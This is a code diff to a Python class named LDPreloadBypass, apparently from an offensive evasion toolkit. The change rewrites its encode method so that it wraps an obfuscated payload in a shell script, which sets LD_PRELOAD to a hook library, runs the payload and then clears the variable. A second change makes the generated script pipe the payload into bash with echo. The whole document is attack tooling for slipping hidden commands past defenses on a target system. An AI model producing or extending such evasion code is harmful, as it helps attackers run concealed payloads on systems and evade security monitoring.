@@ -17,26 +17,18 @@ class LDPreloadBypass:
         self.library_name = f"lib{''.join(random.choices(string.ascii_lowercase, k=6))}.so"
     
     def encode(self, payload):
-        """Generate LD_PRELOAD bypass wrapper"""
+        """Generate LD_PRELOAD bypass wrapper that preserves obfuscated payload"""
         if isinstance(payload, bytes):
             payload = payload.decode('utf-8')
         
-        # Generate the hook library source
-        hook_library = self._generate_hook_library()
-        
-        # Generate the bypass script
-        bypass_script = self._generate_bypass_script(payload)
-        
-        # Combine everything
-        full_bypass = f"""
-# LD_PRELOAD Bypass Package
-# 1. Hook Library Source (save as hook.c)
-{hook_library}
-
-# 2. Compilation and execution script
-{bypass_script}
-"""
-        return full_bypass
+        # Instead of generating full bypass, just wrap the obfuscated payload
+        bypass_wrapper = f'''
+# LD_PRELOAD Bypass - Execute with library preloading
+export LD_PRELOAD="./libhook.so"
+{payload}
+unset LD_PRELOAD
+'''
+        return bypass_wrapper
     
     def _generate_hook_library(self):
         """Generate C library for function hooking"""
@@ -117,9 +109,9 @@ fi
 export LD_PRELOAD=./{self.library_name}
 echo "[+] LD_PRELOAD set to: $LD_PRELOAD"
 
-# Execute payload with hooks active
-echo "[+] Executing payload..."
-{payload}
+# Execute obfuscated payload with hooks active
+echo "[+] Executing obfuscated payload..."
+echo "{payload}" | bash
 
 # Clean up
 unset LD_PRELOAD
